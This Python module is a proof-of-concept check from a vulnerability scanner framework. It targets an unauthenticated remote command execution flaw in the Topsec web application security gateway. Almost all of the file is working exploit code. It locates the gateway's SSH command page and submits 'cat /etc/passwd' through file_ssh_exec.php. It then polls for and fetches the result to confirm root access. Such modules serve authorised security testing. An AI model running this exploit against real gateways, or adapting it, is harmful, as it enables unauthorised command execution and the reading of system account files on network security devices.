# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time

class Vuln(ABVuln):
    vuln_id = 'TOPSEC_0031'  # 平台漏洞编号，留空
    name = '天融信WEB应用安全网关 任意命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-08-03'  # 漏洞公布时间
    desc = '''
        天融信WEB应用安全网关任意命令执行。
        /function/ssh/file_ssh.php
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '天融信应用安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'd5ba7bb1-aacc-4a91-9d17-f180c4df1662'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer: http://www.wooyun.org/bugs/wooyun-2015-0131155
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/function/ssh/file_ssh.php'
            #不同网站id可能不同，默认id为1,若file_ssh.php无法访问，则尝试以默认id执行命令
            exec_id = str(10)
            #获取执行命令页面id
            code, _head, res, _err, _ = hh.http(url)
            if code == 200:
                m = re.search(r'onclick="window\.open\(\'file_ssh_exec\.php\?action=user_query&id=([\d]*)\'\)" value="执行命令"', res)
                if m:
                    exec_id = m.group(1)
            post = 'cmd=cat+%2Fetc%2Fpasswd&action=user_cmd_submit&id=' + exec_id
            #执行命令
            exec_url = arg + '/function/ssh/file_ssh_exec.php'
            code, _head, res, _err, _ = hh.http(exec_url, post=post)
            if code != 200:
                return False
            #等待执行结果，最多等待50s
            result_id = False
            for _i in range(5):
                #debug(str(i))
                time.sleep(10)
                code, _head, res, _err, _ = hh.http(arg + '/function/ssh/file_ssh_exec.php?action=get_real_content&lines=1&page_num=1&id=' + exec_id)
                if (code == 200) and ('查看' in res):
                    m = re.search(r'a href="file_ssh_result\.php\?cmd_id=([\d]*)"', res)
                    if m:
                        result_id = m.group(1)
                        break
            if not result_id:
                return False
            #获取执行结果
            code, _head, res, _err, _ = hh.http(arg + '/function/ssh/file_ssh_result.php?cmd_id=' + result_id)
            #print code, head, res, err
            if (code == 200) and 'root:' in res:
                #security_hole('command execution: ' + arg + '/function/ssh/file_ssh_exec.php?action=get_real_content&lines=1&page_num=1&id='+exec_id)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
